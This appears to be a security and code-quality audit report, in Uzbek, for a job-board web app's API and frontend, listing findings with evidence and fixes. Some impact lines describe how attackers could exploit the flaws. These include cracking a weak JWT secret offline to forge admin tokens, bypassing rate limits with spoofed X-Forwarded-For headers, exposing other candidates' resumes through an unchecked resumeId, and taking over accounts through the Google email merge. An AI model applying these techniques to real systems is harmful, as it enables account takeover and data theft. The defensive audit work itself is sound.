evidence: api.ts:37 `const EMPTY_STATS: Stats = { vacancies: 0, companies: 0, applicationsToday: 0 }`; api.ts:500 `if (!res || !res.ok) return EMPTY_STATS;`. index/+data.ts:4-8 xatoni ajratmaydi.
recommended_fix: fetchStats xatoda `null` qaytarsin. +Page stats === null bo'lsa statistika blokini chizmasin. Home vacancies/companies uchun ham xato holatida `null` qaytarib, blokni yashirish kerak.
dependencies: /api/stats indeks fix'i (quyida) xato ehtimolini kamaytiradi

title: /api/employer/applications — chegarasiz ro'yxat + har ariza uchun TO'LIQ rezyume (experience/education/skills) + statusHistory + vacancy._count
root_cause: findMany'da take/skip yo'q; include ichida resume.experience/education/skills, statusHistory, jobSeeker.profile.region, vacancy._count.applications. where esa ikki bosqichli relation filtr (`vacancy.company.ownerUserId`) — Prisma Mongo buni $lookup pipeline orqali bajaradi (applications→vacancies→companies), Application tomonida ownerUserId bo'yicha hech qanday indeks ishlamaydi.
impact: 50k ariza miqyosida yirik ish beruvchi (bir necha ming ariza) uchun bitta so'rov 5–10 MB JSON qaytaradi, 6+ ta ichki Prisma so'rovi ($in ro'yxatlari minglab id bilan), sahifa sekin ochiladi yoki timeout — asosiy employer flow. Vacancy._count har ariza uchun takror hisoblanadi (Prisma Mongo'da _count qanday bajarilishi — low confidence).
evidence: applications.routes.ts:128-177: `prisma.application.findMany({ where: { vacancy: { company: { ownerUserId } } }, include: { vacancy: {..., _count: { select: { applications: true } } }, statusHistory: {...}, jobSeeker: {...}, resume: { include: { experience, education, skills } } }, orderBy: { createdAt: 'desc' } })` — take yo'q. schema.prisma:465-467: Application indekslari faqat [vacancyId,jobSeekerId], [jobSeekerId], [resumeId].
recommended_fix: 1) Avval `company.findFirst({ ownerUserId })` (indeks ownerUserId) → `vacancy.findMany({ companyId, select:{id} })` (indeks companyId) → `application.findMany({ vacancyId: { in: ids } })` (unique [vacancyId,jobSeekerId] prefiksi ishlaydi). 2) `page/pageSize` (max 50) + `vacancyId`/`status` filtri, `{ items, total, page }` qaytarish. 3) Ro'yxatda rezyumedan faqat `{ id, title, skills (max 10) }` — to'liq rezyume alohida `GET /api/applications/:id` (owner tekshiruvi bilan). 4) Vacancy applicationCount'ni bir marta `application.groupBy({ by:['vacancyId'] })` bilan olish. 5) `@@index([vacancyId, createdAt])` yoki [vacancyId, status].
dependencies: Frontend apps/web/src/pages/employer/applications/+Page.tsx (items massivi, resume maydonlari) va e2e-check.mjs'dagi tekshiruvlar sahifalashga moslanishi kerak.
fix_risk: O'rta: javob shakli o'zgaradi (paginated); eski klientlar `items` ni to'liq deb kutsa qisqa ro'yxat ko'radi. Backward-compat uchun `page` berilmasa default 50 va `hasMore` qaytarish mumkin.

title: Ariza yuborishda body.resumeId nomzodga tegishli ekani tekshirilmaydi: begona rezyume employer'ga ochiladi
root_cause: `applySchema.resumeId` faqat ObjectId formatini tekshiradi. 39-61 qatorlarda `resumeId = body.resumeId` to'g'ridan-to'g'ri saqlanadi, `resume.jobSeeker.userId === req.user.sub` tekshiruvi yo'q.
impact: Bir kishi seeker va employer hisoblarini ochib, o'z vakansiyasiga boshqa nomzodning resumeId'si bilan ariza beradi. Keyin `/api/employer/applications` o'sha rezyumeni to'liq qaytaradi: tajriba, ta'lim, ko'nikmalar, summary, desiredSalary (applications.routes.ts:168-174). Resume ID'lar ommaviy endpoint'larda chiqmaydi, ObjectId'ni taxmin qilish kerak bo'ladi, shuning uchun P0 emas.
evidence: applications.routes.ts:13 `resumeId: objectId().optional()`, 39 `let resumeId = body.resumeId;`, faqat `!resumeId` bo'lganda o'z rezyumesi qidiriladi (40-49), 61 `resumeId` create'ga yoziladi.
recommended_fix: `body.resumeId` berilsa `prisma.resume.findFirst({ where: { id: body.resumeId, jobSeeker: { userId: req.user.sub } }, select: { id: true } })` bilan tekshirish; topilmasa 400/404 qaytarish.
dependencies: Yo'q

title: Ariza holati o'tishlari tekshirilmaydi: rejected→viewed/invited, accepted→rejected va bir xil holatga qayta o'rnatish ham ruxsat
root_cause: statusSchema 4 ta holatdan istalganini qabul qiladi, joriy `application.status` bilan hech qanday qoida yoki no-op tekshiruvi yo'q. Har chaqiruvda history yozuvi va nomzodga notify yaratiladi.
impact: Rad etilgan nomzodga 'Ko'rildi 👀' yoki 'Suhbatga taklif' bildirishnomasi boradi, qabul qilingan esa jimgina rad etiladi. Bir xil holat qayta yuborilsa (masalan ikki tab yoki qayta urinish) statusHistory'da takror yozuv va takror email/Telegram/push chiqadi. Frontend select ham har qanday holatni taklif qiladi (ApplicationSidebar.tsx:86), faqat joriy holat bilan tenglikni bloklaydi (79, 104).
evidence: applications.routes.ts:18-21 statusSchema; 217-240: holatni o'qib, shartsiz update + history; 262-276: har doim notify. ApplicationSidebar.tsx:62-65, 127: quick action'lar faqat joriy holatni yashiradi.
recommended_fix: 1) `if (status === application.status) return application;` (history ham notify ham yo'q). 2) Minimal allowed-map: sent→{viewed,invited,rejected,accepted}; viewed→{invited,rejected,accepted}; invited→{accepted,rejected}; rejected→{invited} (qayta ko'rib chiqish ruxsat bo'lsa); accepted→{} yoki {rejected}; 'viewed'ga faqat 'sent'dan o'tiladi. Boshqa o'tishlar 409 qaytaradi. Frontend SETTABLE_STATUSES ro'yxati joriy holatga qarab shu map bo'yicha filtrlanadi.
dependencies: lib/employer/applications/adapter.ts SETTABLE_STATUSES, ApplicationSidebar.tsx, markViewed (EmployerApplicationsView.tsx:127-134) 409'ni to'g'ri qayta ishlasin.
fix_risk: O'rta: product qaysi o'tishlarga ruxsat berishini hal qilishi kerak. e2e'ga yangi check qo'shish kerak.

title: Nomzodlar bazasi bepul tarifda 402 qaytaradi, frontend buni 'nomzod topilmadi' bo'sh holati sifatida ko'rsatadi
root_cause: Backend `assertCanSearchCandidates` chaqiradi: FREE_FALLBACK va free plan'da `canSearchCandidates: false` (billing.service.ts:24,113,171-179). Frontend `fetchCandidates` `authGet` ishlatadi, u har qanday !ok javobda `{ items: [] }` fallback qaytaradi (api.ts:715-719, 779-782). Sahifada xato holati umuman yo'q.
impact: Monetizatsiya core flow'ga bog'langan (product rule 1 buziladi), API xatosi bo'sh holat bo'lib ko'rinadi (rule 4 buziladi). Header'da employer uchun 'home' aynan /employer/candidates (Header.tsx:70), ya'ni har bir yangi employer asosiy sahifasida doimo 'nomzod topilmadi'ni ko'radi. e2e-check.mjs:526-529 402'ni kutilgan xulq deb tasdiqlaydi.
evidence: candidates.routes.ts:236-244; billing.service.ts:171-179 (402 PLAN_FEATURE_LOCKED); api.ts:717 `if (!res || !res.ok) return fallback;`; pages/employer/candidates/+Page.tsx:30-33, 41-43, 100-104 (empty); Header.tsx:54,70; e2e-check.mjs:526-529.
recommended_fix: candidates.routes.ts'dan `assertCanSearchCandidates` chaqiruvini olib tashlash (kompaniya bor-yo'qligi tekshiruvi qoladi). e2e check'ni '200, 402 yo'q' deb o'zgartirish. Frontend: fetchCandidates `lib/employer/vacancies/api.ts` dagi `getJson` kabi ApiError otsin, sahifada alohida error holati va 'Qayta urinish' tugmasi bo'lsin.
dependencies: Nomzod maxfiyligi bo'yicha alohida topilma (email/phone ochilishi) bilan birga ko'rib chiqing: gate olib tashlansa, bu ma'lumotni barcha employer'lar ko'radi.
fix_risk: O'rta: kontaktlar hamma employer'ga ochiladi. Frontend o'zgarishi xavfsiz.

title: Rad etilgan vakansiyaning chiqish yo'li yo'q: tahrirlash holatni o'zgartirmaydi, PATCH esa rejected'dan o'tishga ruxsat bermaydi
root_cause: PATCH allowedFrom = { active: [archived, draft], archived: [active] }, 'rejected' ham 'moderation' ham yo'q. PUT holatga umuman tegmaydi (160-187, e2e-check.mjs:660-661 ham shuni tasdiqlaydi). Employer yo'lida hech narsa status='moderation' qo'ymaydi: POST darhol 'active' (vacancies.service.ts:435, 457-458). Shuning uchun admin rad etgan vakansiyani qayta moderatsiyaga yuborib bo'lmaydi.
impact: Admin rad etgan vakansiya abadiy 'rejected' holatida qoladi. Employer uni tahrirlaydi, lekin qayta yubora olmaydi, yagona yo'l o'chirib qaytadan yaratish (u ham arizalarni cascade o'chiradi). 'Moderatsiyada' statistikasi kartasi amalda doimo 0 (VacancyStats.tsx:12). frontend vacancyCapabilities rejected uchun faqat edit va delete beradi (adapter.ts:97-103).
evidence: vacancies.routes.ts:195-223; admin.routes.ts:262-298 (moderate: active|rejected|archived, rejectionReason); adapter.ts:96-103; DESIGN.md:77-78 ('Qayta yuborish yo'q — backendda yo'q').
recommended_fix: Minimal va backward-compatible: PUT'da, agar `vacancy.status === 'rejected'` va rol admin bo'lmasa, update data'ga `status: 'moderation', rejectionReason: null` qo'shish. Admin mavjud `/api/admin/vacancies/:id/moderate` orqali tasdiqlaydi. Frontend: edit'dan keyin notice 'moderatsiyaga yuborildi' deb chiqadi, VacancyRow rejected holatida 'Tahrirlash va qayta yuborish' yorlig'ini ko'rsatadi.
dependencies: admin.routes.ts moderation navbati. i18n notice. e2e-check.mjs:660 (PUT status o'zgarmaydi) check'i rejected holati uchun yangilanishi kerak.
fix_risk: Past-o'rta: faqat rejected holatiga ta'sir qiladi.

title: Vakansiyani o'chirish nomzodlarning arizalari va holat tarixini jimgina butunlay o'chiradi
root_cause: `prisma.vacancy.delete` ishlatiladi, Application relation'i `onDelete: Cascade` (schema.prisma:458), ApplicationStatusHistory ham Cascade (479). Arizalar soniga qarab to'siq yo'q, nomzodga bildirishnoma ham yo'q.
impact: Employer faol, 50 ta arizasi bor vakansiyani bir tugma bilan o'chiradi va nomzodlarning 'Mening arizalarim' ro'yxatidan yozuvlar izsiz yo'qoladi. Employer'ning ham ariza tarixi yo'qoladi. UI o'chirishni istalgan holatda taklif qiladi (VacancyRow.tsx:237). Dialog faqat employer'ni ogohlantiradi (messages.uz.ts:2223), nomzodlarni emas.
evidence: vacancies.routes.ts:226-236; schema.prisma:458, 479; VacancyRow.tsx:235-238; favorites ham cascade (schema.prisma:560).
recommended_fix: Backward-compatible: non-admin uchun, agar `_count.applications > 0` bo'lsa, 409 'Arizasi bor vakansiyani o'chirib bo'lmaydi — yoping' qaytarish. Frontend 'O'chirish' faqat arizasiz vakansiyalar uchun ko'rinsin, arizasi borlariga 'Yopish' taklif qilinsin. Qoralamalar (arizasiz) avvalgidek o'chiriladi.
dependencies: vacancyActionErrorKind (409 → transition matni) moslashtirilsin. e2e-check.mjs:290, 668, 739 da DELETE'lar arizasiz vakansiyalarda ekanini tekshiring.
fix_risk: O'rta: mavjud e2e'lar arizali vakansiyani o'chirsa, ular yiqiladi.

title: Kompaniya profilini yuklash xatosi bo'sh forma bo'lib ko'rinadi, saqlansa mavjud kompaniya ma'lumotlari null bilan ustidan yoziladi
root_cause: `fetchMyCompany` !ok yoki tarmoq xatosida `null` qaytaradi. EmployerProfile buni 'kompaniya yo'q' deb talqin qilib bo'sh forma chizadi (profile/+Page.tsx:251-255, 286). Saqlashda `description/website/regionId/industry/... : null` yuboriladi (EmployerCompanyForm.tsx:82-90). PUT upsert mavjud kompaniyani topib, shu null'lar bilan yangilaydi (companies.routes.ts:88-103). fetchRegions xatosi ham xuddi shunday: bo'sh select, regionId null bo'lib ketadi.
impact: Vaqtinchalik 5xx yoki tarmoq uzilishida employer 'profil bo'sh' deb o'ylaydi, nomni yozib saqlaydi va tavsif, sayt, hudud, soha, xodimlar soni, tashkil topgan yil o'chib ketadi. Rule 4 buziladi va ma'lumot yo'qoladi.

title: load() javobi resumeRef'ni saqlash navbatidan mustaqil ustidan yozadi — to'liq-hujjat PUT keyingi saqlashda o'zgarishni o'chirishi mumkin
root_cause: `saveResume` (105-123) `merged = {...resumeRef.current, ...patch}` qilib BUTUN rezyumeni PUT qiladi. `load()` (66-76) esa GET natijasini tekshiruvsiz `resumeRef.current = r` qiladi (75). Ikkalasi bir vaqtda ketsa (masalan token yangilanishi load'ni chaqirdi, shu payt SkillsEditor unmount flush'i PUT yubordi — SkillsEditor.tsx:45), GET javobi PUT'dan keyin kelsa resumeRef eskirgan holatga qaytadi; keyingi har qanday bo'lim saqlashi (experience/education patch) eski skills bilan PUT qiladi → yangi ko'nikmalar serverdan o'chadi.
impact: Foydalanuvchi ma'lumoti jimgina yo'qoladi (data loss), xato ko'rinmaydi.
evidence: useProfileData.ts:66 `await Promise.all([fetchProfile, fetchResume, fetchRegions])`, :75 `resumeRef.current = r;` (navbat/versiya tekshiruvi yo'q); :109 `const merged = { ...EMPTY_RESUME, ...(resumeRef.current ?? {}), ...patch }`; :112 `putResume(token, toInput(merged, fallback))`.
recommended_fix: load() ni ham queueRef orqali ketma-ketlashtiring (`queueRef.current = queueRef.current.then(run)`) yoki load'da `if (queue pending) return`; qo'shimcha: load uchun `seq` counter — eskirgan javob e'tiborsiz. Uzoq muddat: PUT o'rniga backend'da PATCH/bo'limli endpoint.
dependencies: Topilma #1 bilan birga tuzatilsa (token refresh load'ni chaqirmasa) ehtimol keskin kamayadi.

title: JWT_ACCESS_SECRET/JWT_REFRESH_SECRET uchun minimal uzunlik 8 belgi — HS256 tokenini oflayn brute-force qilib admin token yasash mumkin
root_cause: `JWT_ACCESS_SECRET: z.string().min(8)`, `JWT_REFRESH_SECRET: z.string().min(8)` (env.ts:18-19); .env.example'da `"kamida-8-belgi-tasodifiy-satr"` / `"boshqa-tasodifiy-satr"` — deploy qiluvchi qisqa/lug'aviy satr qo'yishi ehtimoli yuqori. Token HS256 (jwt.ts:132,136), payload'da `role` (jwt.ts:126-129) va requireRole token'dagi rolga ishonadi (auth-guard.ts:170-175), adminRoutes `requireRole("admin")` (admin.routes.ts:19).
impact: Har qanday ro'yxatdan o'tgan foydalanuvchi o'z access tokenini olib (localStorage) hashcat bilan 8-12 belgili sirni oflayn topadi → `{sub: <o'zi>, role: 'admin'}` token imzolaydi → /api/admin/* (foydalanuvchilarni bloklash, rol berish, broadcast) va barcha employer/candidate ma'lumotlari. Refresh sirini topsa — 30 kunlik seans, blok tekshiruvi o'tadi lekin `sub` istalgan user bo'lishi mumkin.
evidence: env.ts:18-19 `.min(8)`; .env.example: `JWT_ACCESS_SECRET="kamida-8-belgi-tasodifiy-satr"`; jwt.ts:131-137 `jwt.sign(payload, env.JWT_ACCESS_SECRET, { expiresIn: "15m" })` (alg default HS256); auth-guard.ts:173 `if (!roles.includes(req.user.role)) throw Errors.forbidden();`
recommended_fix: `z.string().min(32)` (prod'da) + .env.example'da `openssl rand -base64 48` ko'rsatmasi; prod'da access va refresh sirlari bir xil bo'lsa ham rad etish. jwt.ts'da `jwt.verify(token, secret, { algorithms: ["HS256"] })` ni aniq yozish. Uzoq muddatda admin route'larda `requireStaff` (DB'dan rol) ishlatish (admin.routes.ts:19).
dependencies: Deploy hujjatlari (DEPLOY.md), Railway Variables
fix_risk: Mavjud qisqa sir bilan server ko'tarilmaydi (aniq xabar chiqadi) — deploy paytida sirni yangilash barcha seanslarni tugatadi

title: prestart: har prod start'da `prisma db push` — tekshirilmagan schema o'zgarishi, destruktiv xatoda crash-loop, listen'dan oldin indeks build

title: trustProxy: true bo'lgani uchun X-Forwarded-For'ni soxtalashtirib rate limit'ni (login brute-force 10/min ham) chetlab o'tish mumkin
root_cause: trustProxy: true bilan req.ip XFF zanjiridagi eng chapdagi (mijoz yozgan) manzil bo'ladi. @fastify/rate-limit (server.ts:103) keyGenerator bermagan, shuning uchun req.ip ishlatiladi. Strict limit ham shu kalit bilan ishlaydi (auth.routes.ts:55-57, team.routes.ts:26).
impact: Hujumchi har so'rovda 'X-Forwarded-For: <tasodifiy>' yuboradi: login/register/staff-invite accept'da parol brute-force va umumiy 600/min limit amalda yo'q.
evidence: server.ts:48-53 (trustProxy: true), 103 (keyGenerator yo'q); auth.routes.ts:56; e2e'da 429 tekshiruvi yo'q (grep '429' = 0).
recommended_fix: trustProxy: 1 qo'ying (Railway edge bitta hop) yoki env TRUST_PROXY_HOPS bilan boshqaring. Muqobil: rate-limit keyGenerator'da XFF'ning o'ngdan N-chi elementini oling. e2e'ga check: soxta XFF bilan 11-login → 429.
dependencies: Railway proxy hop soni amalda tekshirilishi kerak (req.ips logi bilan). Vercel SSR so'rovlari IP'si ham shu hisobga ta'sir qiladi.
fix_risk: O'rta: hop soni noto'g'ri bo'lsa hamma bitta proxy IP'ga tushib, sayt 429 olishi mumkin — deploydan keyin req.ip'ni tekshiring.

title: Pino default serializer access token (WS ?token=) va staff invite token'ini URL bilan logga yozadi
root_cause: Fastify({ logger: true }) har so'rov uchun req.url'ni 'incoming request' logiga yozadi. WS token query'da keladi (chat.routes.ts:71-76). Staff invite token path'da: GET/POST /api/staff-invites/:token (team.routes.ts:215,221). Redact yoki serializer yo'q.
impact: Railway loglariga kira oladigan har kim (yoki log eksporti) 15 daqiqalik access token'lar va bir martalik jamoa taklif token'larini ko'radi. Taklifni qabul qilib content_editor roli olish mumkin (token hali ishlatilmagan bo'lsa).
evidence: server.ts:48 logger: true; chat.routes.ts:75-76 url.searchParams.get('token'); team.routes.ts:215,221.
recommended_fix: logger: { serializers: { req(req) { return { method: req.method, url: req.url.replace(/([?&]token=)[^&]+/, '$1[REDACTED]').replace(/(\/staff-invites\/)[^/?]+/, '$1[REDACTED]'), hostname: req.hostname, remoteAddress: req.ip } } }, redact: ['req.headers.authorization','req.headers.cookie'] }. Uzoq muddatda WS uchun query token o'rniga bir martalik qisqa ticket.
dependencies: Yo'q

title: Ariza yuborishda `resumeId` egaligi tekshirilmaydi — boshqa nomzodning rezyumesini o'z arizasiga biriktirish mumkin
root_cause: `applySchema.resumeId` (13) faqat ObjectId formati tekshiriladi. Handler (39-49) `resumeId` berilgan bo'lsa uni `prisma.application.create` ga (57-65) to'g'ridan-to'g'ri yozadi; rezyume `req.user.sub` ga tegishli ekani yoki umuman mavjudligi tekshirilmaydi. Auto-biriktirish faqat `!resumeId` holatda ishlaydi.
impact: Nomzod istalgan (masalan, taxminiy yoki oshkor bo'lgan) resume id'sini yuborsa ish beruvchi `/api/employer/applications` (168-174) va `/api/vacancies/:id/applications` (203) orqali begona nomzodning to'liq rezyumesini (tajriba, ta'lim, ko'nikma) ko'radi — shaxsiy ma'lumot sizishi. Mavjud bo'lmagan id bo'lsa `include: { resume }` bilan o'qishda nomuvofiq yozuv qoladi.
evidence: applications.routes.ts:13 `resumeId: objectId().optional()`; :39-40 `let resumeId = body.resumeId; if (!resumeId && !vacancy.applyWithoutResume) {...}`; :57-63 `data: { vacancyId, jobSeekerId: req.user!.sub, resumeId, ... }`.
recommended_fix: `body.resumeId` berilganda `prisma.resume.findFirst({ where: { id: body.resumeId, jobSeeker: { userId: req.user!.sub } }, select: { id: true } })` — topilmasa `Errors.badRequest("Rezyume topilmadi")`. Amalda frontend (api.ts:173-175) resumeId yubormaydi, shuning uchun parametrni butunlay olib tashlash ham mumkin.

title: Nomzodlar qidiruvi hali ham tarifga bog'langan (402) va frontend bu xatoni "Nomzod topilmadi" bo'sh holati sifatida ko'rsatadi

title: 401 (token eskirgan) uchun qayta-refresh yo'li yo'q — fon tab/uyqudan keyin sahifalar bo'sh holat yoki 'Qayta urinish' tuzog'ida qotib qoladi
root_cause: Access token 15 daqiqa; AuthContext faqat `setInterval(12 min)` (75-85) bilan yangilaydi. Brauzer fon tabda taymerlarni to'xtatadi / noutbuk uyqudan uyg'onganda token allaqachon eskirgan bo'ladi. Hech bir fetch qatlamida (api.ts `authGet` 715-719, apiExtra.ts `get` 44-48, `send` 51-71, lib/*/api.ts) 401 kelganda `refreshAccessToken()` + qayta urinish yoki `status = guest` mantiqi yo'q; faqat useApplication.ts:79 login'ga yo'naltiradi. Bundan tashqari `fetchMe` (api.ts:160-164) tarmoq/5xx xatosida ham `null` qaytaradi, AuthContext (42-66) buni "token yaroqsiz" deb localStorage'ni tozalab guest qiladi.
impact: Eskirgan token bilan: `authGet`/`get` ga tayangan sahifalar (kandidatlar, obunalar, admin jadvallari, profil SavedJobs, header sonlari) jimgina BO'SH holat ko'rsatadi; `ApiError` uloqtiruvchi sahifalar (employer vakansiyalar/murojaatlar, xabarlar, sevimlilar, bildirishnomalar) "Qayta urinish" ko'rsatadi, lekin tugma o'sha eskirgan tokenni qayta yuboradi → yana 401 → foydalanuvchi sahifani to'liq yangilamaguncha chiqib keta olmaydi. API vaqtincha 5xx bersa foydalanuvchi mijoz tomonda 'chiqib ketadi'.
evidence: AuthContext.tsx:77-83 `window.setInterval(async () => { const fresh = await refreshAccessToken(); ... }, 12*60*1000)`; api.ts:715-719 `authGet ... if (!res || !res.ok) return fallback;`; api.ts:160-164 `fetchMe ... if (!res || !res.ok) return null;`; grep `status === 401` faqat useApplication.ts:79.
recommended_fix: Bitta `authFetch(path, init)` yordamchisi: 401 kelsa `refreshAccessToken()` (bir marta, in-flight promise bilan deduplikatsiya), localStorage + context tokenni yangilab so'rovni qayta yuboradi; refresh ham bo'sh qaytsa `logout()`/guest holati va login'ga yo'naltirish. `fetchMe` 401 va tarmoq/5xx ni farqlasin (5xx'da tokenni o'chirmaslik). `visibilitychange`/`focus` da refresh.
dependencies: api.ts, apiExtra.ts, lib/**/api.ts, lib/admin/http.ts — barcha fetch qatlamlari
fix_risk: O'rta — barcha so'rov yo'llariga tegadi; refresh cookie SameSite=None prod sozlamasi o'zgarmaydi

title: Refresh token server tomonda bekor qilinmaydi: logout faqat cookie'ni tozalaydi, rotatsiya eski tokenni yaroqli qoldiradi

impact: O'g'irlangan/nusxalangan refresh cookie (XSS emas — httpOnly, lekin qurilma/backup/proxy log orqali) foydalanuvchi logout qilganidan keyin ham 30 kun ishlaydi. Parol o'zgarganda (kelajakda #4) eski seanslar uzilmaydi. Admin blok — refresh'da tekshiriladi (267), bu yaxshi.
evidence: apps/api/src/modules/auth/auth.routes.ts:90-93; apps/api/src/modules/auth/auth.service.ts:257-277; apps/api/prisma/schema.prisma:160-200.
recommended_fix: Backward-compatible minimal: User'ga `tokenVersion Int @default(0)`; signRefreshToken payload'iga `v`; refreshSession'da `payload.v !== user.tokenVersion` -> 401; logout'da (agar refresh cookie yaroqli bo'lsa) tokenVersion++ ("shu qurilma" uchun jti-list kerak bo'lsa keyin). Eski `v`siz tokenlar: `payload.v ?? 0` deb qabul qiling (migratsiyasiz). Parol reset/admin blok'da ham tokenVersion++.
dependencies: prisma db push; #4 va #5 shu mexanizmga tayanadi. Bitta tokenVersion++ barcha qurilmalarni chiqaradi — UX'da "barcha qurilmalardan chiqish" deb ko'rsating.
fix_risk: Past: `v` yo'q eski tokenlar 0 deb qabul qilinadi, mavjud seanslar uzilmaydi.

title: Email tasdiqlanmaydi; Google login email bo'yicha mavjud hisobga birlashadi — pre-account takeover
root_cause: registerUser (auth.service.ts:175-198) `isEmailVerified` ni false qoldiradi va tasdiq oqimi yo'q. googleLogin (317-321) verified Google email bilan `findUnique({ email })` topsa, hisob kimniki va qanday yaratilganidan qat'i nazar sessiya beradi.
impact: Hujumchi jabrlanuvchining email'i bilan oldindan parol qo'yib ro'yxatdan o'tadi (409 faqat mavjud bo'lsa). Jabrlanuvchi keyin "Google bilan davom etish" ni bossa — hujumchi yaratgan hisobga kiradi; hujumchi parol bilan o'sha hisobga doimiy kirish saqlab qoladi (rezyume, arizalar, chatlar). Bundan tashqari begona email bilan ro'yxatdan o'tish notification/mailer spam manbai.
evidence: apps/api/src/modules/auth/auth.service.ts:175-198 (isEmailVerified yo'q), 313-321 (email bo'yicha merge, tasdiq tekshirilmaydi).
recommended_fix: Minimal: googleLogin'da `existing.isEmailVerified === false` bo'lsa merge qilmasdan 409 `EMAIL_UNVERIFIED` qaytaring (yoki parolni tasodifiy hash bilan almashtirib eski sessiyalarni tokenVersion bilan uzing va isEmailVerified=true qiling). To'liq: register'dan keyin email tasdiqlash xati (invite naqshi), tasdiqlanmagan hisobga Google merge'ni taqiqlash.
dependencies: #4 (reset infratuzilmasi) va #6 (tokenVersion) bilan bir xil token jadvali/mexanizmi.
fix_risk: Past-o'rta: mavjud parol-hisobi bor foydalanuvchi Google bilan kirmoqchi bo'lsa xabar oladi — UX matni 3 tilda kerak.

title: Access token WS query string'da va invite token URL path'da — Fastify default request logger ularni loglarga yozadi
root_cause: server.ts:441-447 `logger: true`, `disableRequestLogging`/`serializers`/`redact` yo'q (grep bo'sh) — Fastify har so'rovda `req.url` ni (query bilan) info darajasida yozadi. WS mijozi tokenni `?token=` bilan yuboradi (useChatSocket.ts:35, useNotifications.ts:63), server 75-76 shu yerdan o'qiydi. Staff invite tokeni GET/POST path'ida (team.routes.ts:215,221) va WEB_ORIGIN havolasida (137) — Referer/brauzer tarixi/loglarga tushadi.
impact: Railway loglarini ko'ra oladigan har kim (yoki log agregatori) 15 daqiqalik access tokenlarni (userId+role) va 7 kunlik bir martalik admin-invite tokenini oladi. #2 bilan birga — secret brute-force uchun tayyor material.
evidence: apps/api/src/server.ts:441-447; apps/api/src/modules/chat/chat.routes.ts:70-80; apps/web/src/lib/useChatSocket.ts:35; apps/web/src/lib/useNotifications.ts:63; apps/api/src/modules/team/team.routes.ts:137,215,221.
recommended_fix: Minimal, backward-compatible: server.ts'da `logger: { serializers: { req(req) { return { method: req.method, url: req.url.split("?")[0], ... } } } }` (query'ni kesish). Yaxshiroq: WS'da tokenni birinchi `{type:"auth",token}` xabarida qabul qiling (query'dagi eski usulni bir muddat saqlab), yoki `Sec-WebSocket-Protocol` orqali. Invite: `/api/staff-invites/lookup` va `/accept` ni POST body bilan qiling; frontend InviteAccept.tsx:31 o'qigach `history.replaceState` bilan URL'dan tokenni olib tashlang.
dependencies: WS protokol o'zgarsa useChatSocket.ts, useNotifications.ts va e2e-check WS testlari.
fix_risk: Past (serializer) / o'rta (WS protokol — ikki usulni parallel qo'llab-quvvatlash kerak).

title: Tarmoq/API xatosi "mehmon" holati sifatida ko'rinadi: fetchMe null qaytarsa saqlangan token o'chiriladi (EMPTY ≠ ERROR buzilgan)
root_cause: api.ts:160-164 fetchMe 401 ni ham, tarmoq xatosini ham (`tryFetch` null) ham `null` qaytaradi. AuthContext.tsx:40-66: stored token bilan fetchMe null -> refresh (tryFetch, tarmoq xatosida null) -> `localStorage.removeItem`, status="guest", konsolga "siz kirmagansiz". login() (87-93) ham fetchMe null bo'lsa muvaffaqiyatli login'dan keyin darhol "guest" qiladi.
impact: API 30 soniya o'chiq bo'lsa (Railway deploy) barcha ochiq tablar foydalanuvchini "chiqib ketgan" deb ko'rsatadi, Header login tugmasiga o'tadi, useRequireRole (useRoleGuard.ts:135-137) employer/admin sahifalaridan /login ga majburan yuboradi. Cookie saqlanganligi uchun keyingi yuklashda tiklanadi, lekin foydalanuvchi buni "sessiya uzildi" deb ko'radi.
evidence: apps/web/src/lib/api.ts:59-66,160-164; apps/web/src/components/AuthContext.tsx:37-71,87-93; apps/web/src/lib/useRoleGuard.ts:133-142.
recommended_fix: fetchMe'ni `{ok:true,user} | {ok:false,reason:"unauthorized"|"network"}` ga ajrating (yoki 401 da null, boshqa holda throw). AuthContext: faqat 401/403 da tokenni o'chirib guest qiling; network/5xx da `status: "loading"`ni saqlab (yoki "unknown") backoff bilan qayta urinib ko'ring; useRequireRole faqat aniq "guest" da redirect qilsin.
dependencies: useRoleGuard.ts, AdminShell.tsx status semantikasi; Header.tsx.
fix_risk: Past-o'rta: "loading" cheksiz qolmasligi uchun retry chegarasi va UI'da "Server bilan aloqa yo'q" holati kerak.

title: API mijozida 401 -> refresh -> retry yo'q; faqat 12 daqiqalik interval — uyqudan uyg'ongan tab/telefon birinchi so'rovlarda 401 oladi
root_cause: AuthContext.tsx:75-85 setInterval(12 min). api.ts'da 401 uchun hech qanday umumiy ishlov yo'q (grep `401` bo'sh); authRequest (72-91) xatoni ApiError qilib tashlaydi. Brauzer background tab'da timerlarni to'xtatadi/kechiktiradi; mobil Safari sahifani muzlatadi — uyg'onganda birinchi fokus-refetch/ariza yuborish eskirgan token bilan ketadi.
impact: Foydalanuvchi "Token yaroqsiz yoki muddati tugagan" xatosini ko'radi (masalan ariza yuborishda), sahifani yangilashi kerak. Multi-tab: har tab o'zi refresh qiladi (rotatsiya revocation'siz, shuning uchun race yo'q — hozircha; #6 tokenVersion++ logout'da qilinsa ham muammo yo'q).
evidence: apps/web/src/components/AuthContext.tsx:73-85; apps/web/src/lib/api.ts:72-91 (401 ishlovi yo'q).
recommended_fix: Bitta `apiFetch` wrapper: 401 kelsa `refreshAccessToken()` (bir vaqtda bitta in-flight promise) -> localStorage yangilash -> so'rovni bir marta takrorlash; muvaffaqiyatsiz bo'lsa logout. Qo'shimcha: `visibilitychange`/`focus` da token `exp` (JWT payload'dan) 2 daqiqadan kam qolgan bo'lsa refresh.
dependencies: api.ts, apiExtra.ts, lib/<feature>/api.ts — token parametri hozir har funksiyaga qo'lda uzatiladi (fetchMe(token) kabi), wrapper token manbasini markazlashtirishi kerak.
fix_risk: O'rta: ko'p API funksiyasi o'zgaradi; bosqichma-bosqich (avval authRequest) qilish mumkin.

title: Himoyalangan sahifalar faqat client-side effect bilan guard qilinadi: SSR shell ko'rinadi, redirect to'liq reload; server +guard.ts yo'q
root_cause: employer/*, applications, favorites, alerts sahifalari `useRequireRole` (useRoleGuard.ts:130-143) — useEffect ichida `window.location.assign` (to'liq sahifa reload). Vike +guard.ts faqat pricing/article/vacancy'da bor (find natijasi), auth sahifalari uchun yo'q (server cookie'ni ko'rmaydi — cookie path=/api/auth, API boshqa domenda, shuning uchun server-side guard hozirgi arxitekturada imkonsiz). AdminShell (57-64) loading'da skeleton — yaxshi; lekin mehmon uchun redirect emas, "ruxsat yo'q" sahifasi (66-92).
impact: Mehmon /employer/vacancies ni ochsa avval sahifa qobig'i (skeleton/bo'sh holat) chiqadi, keyin reload bilan /login — "flash" va ikki marta yuklash. Xavfsizlikka ta'sir yo'q (backend authoritative, ma'lumot tokensiz kelmaydi).
